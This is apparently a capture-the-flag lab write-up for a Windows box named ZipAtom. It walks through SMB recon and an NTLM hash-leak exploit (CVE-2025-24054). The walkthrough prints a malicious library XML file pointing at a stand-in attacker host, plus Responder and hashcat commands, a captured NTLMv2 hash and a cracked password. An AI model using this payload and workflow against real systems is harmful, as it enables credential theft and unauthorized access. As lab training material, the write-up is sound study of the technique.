# ZipAtom

Difficulty: Very Easy
OS: Windows
Category: Red Team

![ff0bce59-dd63-4f2e-b613-daf833e08447-avatar.webp](ff0bce59-dd63-4f2e-b613-daf833e08447-avatar.webp)

### Reconnaissance

Using `nmap -sCV -oN zipAtom-scans [target ip]` You only get two ports, and no UDP ports detected

```python
PORT     STATE SERVICE       VERSION
445/tcp  open  microsoft-ds?
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: ZIPATOM
|   NetBIOS_Domain_Name: ZIPATOM
|   NetBIOS_Computer_Name: ZIPATOM
|   DNS_Domain_Name: ZipATom
|   DNS_Computer_Name: ZipATom
|   Product_Version: 10.0.19041
|_  System_Time: 2025-04-22T12:35:46+00:00
|_ssl-date: 2025-04-22T12:36:27+00:00; +7h00m00s from scanner time.
| ssl-cert: Subject: commonName=ZipATom
| Not valid before: 2025-04-09T19:50:21
|_Not valid after:  2025-10-09T19:50:21
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-04-22T12:35:46
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_clock-skew: mean: 7h00m00s, deviation: 0s, median: 6h59m59s
```

Accessing the smb server with `smbclient -N -L [target ip]` we get

```python
 Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        shared          Disk      

```

The `shared` folder has READ,WRITE. The IPC$ has READ only. We can access the shared folder using null authentication. From there we get a .txt file. 

Download the .txt file and open it, you’ll see the content. `Please put the unclassified documents here as .zip` 

After doing research, I saw an exploit POC **CVE-2025–24054: NTLM Hash Disclosure Spoofing Vulnerability**

> External control of file name or path in Windows NTLM allows an unauthorized attacker to perform spoofing over a network.
> 

The real exploit here is the xml file

```python
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
  <searchConnectorDescriptionList>
    <searchConnectorDescription>
      <simpleLocation>
        <url>\\<ATTACKER-IP-ADDRESS>\shared</url>
      </simpleLocation>
    </searchConnectorDescription>
  </searchConnectorDescriptionList>
</libraryDescription>
```

We can use this POC python script [here](https://github.com/xigney/CVE-2025-24054_PoC/blob/main/PoC.py). Then execute the python script with `python3 [poc.py](http://poc.py) anyfilename [attacker's ip]`

A zip file name `exploit.zip` will be made. Upload this zip file to the smb folder named **Shared**

### Exploitation

Setup a responder on tun0 which is the VPN to listen for the NTLM hash `responder -I tun0` 

Once the zip file is uploaded to the SMB Shared folder, it will be automatically executed.

Keep watch on your responder it will capture the **NTLMv2** hash. 

> NTLM HASH
> 
> 
> Tom::ZIPATOM:762220ebd973344c:6EAB48E28772D481BE271B5B9749E246:010100000000000000B4EC5E2EB3DB01B57C221D152BD72E0000000002000800320046004B00350001001E00570049004E002D0054005A0054004A00340034004300560058005700560004003400570049004E002D0054005A0054004A0034003400430056005800570056002E00320046004B0035002E004C004F00430041004C0003001400320046004B0035002E004C004F00430041004C0005001400320046004B0035002E004C004F00430041004C000700080000B4EC5E2EB3DB0106000400020000000800300030000000000000000100000000200000B734DBC58C968F948C01D8F750C7EE299F4118521014E903061E6EED6868A4230A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310034002E0032000000000000000000
> 

Then we need to crack it using **hashcat** or **jhon the ripper**. But I use hashcat, since this is an NTLMv2 hash the mode for it in hashcat is `5600` with the command `hashcat -m 5600 -a 0 rockyou.txt` 

Once the hashcat has finished cracking the password is revealed after the hash 

```python
<SNIP>000000000000000:TomCruise
```

RDP to the victim, I use Remmina to RDP. `remmina -c rdp://Tom@[target ip]` 

Then navigate to the **Desktop** folder and get the flag

`a3a8b567b81d1c2883f8facf2417042c`